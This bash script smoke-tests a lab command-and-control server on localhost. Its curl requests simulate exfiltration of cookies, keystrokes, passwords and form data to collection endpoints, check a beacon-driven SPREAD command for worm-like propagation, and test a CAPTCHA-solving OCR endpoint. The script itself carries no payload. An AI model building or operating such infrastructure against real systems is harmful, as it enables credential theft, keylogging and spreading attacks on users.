#!/usr/bin/env bash
# ---------------------------------------------------------------
# LAB ONLY — self-cleaning smoke test for c2.py (lab C2 server).
#
# Starts C2 on PORT=8090 with a fixed token and tests:
#   1) token protection (401 without / 200 with token)
#   2) collection endpoints /hello /k /p /f (expect 204)
#   3) beacon -> spread -> beacon loop (SPREAD command is delivered)
#   4) /solve OCR endpoint against a Pillow-generated lab CAPTCHA
# The process is cleaned up automatically (trap).
#
# Usage: bash test_c2.sh (from the repository root)
# Note: runs locally on 127.0.0.1 and sends nothing outside the machine.
# ---------------------------------------------------------------
set -u

PORT=8090
TOK="LABTOKEN"
BASE="http://127.0.0.1:${PORT}"
VID="labsmoke"
ROOT="$(cd "$(dirname "$0")" && pwd)"

PASS=0
FAIL=0
SKIP=0
ok()   { PASS=$((PASS+1)); echo "  [ OK ] $1"; }
bad()  { FAIL=$((FAIL+1)); echo "  [FAIL] $1"; }
skip() { SKIP=$((SKIP+1)); echo "  [SKIP] $1"; }

C2_PID=""
cleanup() {
    if [ -n "${C2_PID}" ] && kill -0 "${C2_PID}" 2>/dev/null; then
        kill "${C2_PID}" 2>/dev/null
        wait "${C2_PID}" 2>/dev/null
    fi
}
trap cleanup EXIT INT TERM

echo "[*] Starting C2 on ${BASE} (token=${TOK})"
cd "${ROOT}"
C2_PORT="${PORT}" C2_TOKEN="${TOK}" python3 c2.py >/tmp/c2_smoke.log 2>&1 &
C2_PID=$!

# Wait for the server to start listening.
for i in $(seq 1 40); do
    if curl -s -o /dev/null "${BASE}/beacon?vid=ping"; then break; fi
    sleep 0.25
done
if ! kill -0 "${C2_PID}" 2>/dev/null; then
    echo "[!] C2 failed to start; log:"; cat /tmp/c2_smoke.log; exit 1
fi
echo "[*] C2 is running (pid ${C2_PID})"
echo

echo "[test] 1) token protection"
code_no=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}/export")
code_ok=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}/export?token=${TOK}")
[ "${code_no}" = "401" ] && ok "GET /export without token -> 401" || bad "GET /export without token -> ${code_no} (expected 401)"
[ "${code_ok}" = "200" ] && ok "GET /export with token -> 200" || bad "GET /export with token -> ${code_ok} (expected 200)"
echo

echo "[test] 2) collection endpoints (expect 204)"
for path in \
    "/hello?vid=${VID}&u=http://lab.local/index.php&co=TESTCOOKIE" \
    "/k?vid=${VID}&k=test123" \
    "/p?vid=${VID}&p=schranka" \
    "/f?vid=${VID}&d=name%3Dlabtester"; do
    code=$(curl -s -o /dev/null -w '%{http_code}' "${BASE}${path}")
    [ "${code}" = "204" ] && ok "GET ${path} -> 204" || bad "GET ${path} -> ${code} (expected 204)"
done
echo

echo "[test] 3) beacon -> spread -> beacon"
curl -s -o /dev/null "${BASE}/beacon?vid=${VID}&u=http://lab.local/index.php"
curl -s -o /dev/null "${BASE}/spread?token=${TOK}"
cmd=$(curl -s "${BASE}/beacon?vid=${VID}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("cmd"))')
[ "${cmd}" = "SPREAD" ] && ok "SPREAD command delivered (cmd=SPREAD)" || bad "beacon returned cmd='${cmd}' (expected SPREAD)"

# Verify the command was consumed (the next beacon should return null).
cmd2=$(curl -s "${BASE}/beacon?vid=${VID}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("cmd"))')
if [ "${cmd2}" = "None" ] || [ "${cmd2}" = "null" ]; then
    ok "command was consumed after delivery (cmd=null)"
else
    bad "second beacon returned cmd='${cmd2}' (expected null)"
fi
echo

echo "[test] 4) OCR endpoint /solve"
if python3 -c "import PIL" 2>/dev/null && command -v tesseract >/dev/null 2>&1; then
    info=$(python3 "${ROOT}/gen_captcha.py")    # prints "digits=NNNN sum=N"
    truth_sum=$(echo "${info}" | sed -n 's/.*sum=\([0-9]\+\).*/\1/p')
    b64=$(base64 -w0 /tmp/cap_lab.jpg)
    # URL-encode base64 (+, /, and = otherwise break the query string).
    got=$(curl -s -G --data-urlencode "img=${b64}" "${BASE}/solve" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("sum"))')
    echo "      ground-truth sum=${truth_sum}  /solve sum=${got}"
    [ "${truth_sum}" = "${got}" ] && ok "/solve returned the correct sum" || bad "/solve returned '${got}' (expected ${truth_sum})"
else
    skip "OCR test requires Pillow and the Tesseract system package"
fi
echo

echo "[test] 5) verify exported events"
ev=$(curl -s "${BASE}/export?token=${TOK}" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("events",[])))')
[ "${ev}" -ge 4 ] 2>/dev/null && ok "export contains ${ev} events" || bad "export contains '${ev}' events (expected >=4)"
echo

echo "===================== SUMMARY ==================="
echo "  PASS=${PASS}  FAIL=${FAIL}  SKIP=${SKIP}"
echo "================================================"
[ "${FAIL}" = "0" ] && exit 0 || exit 1
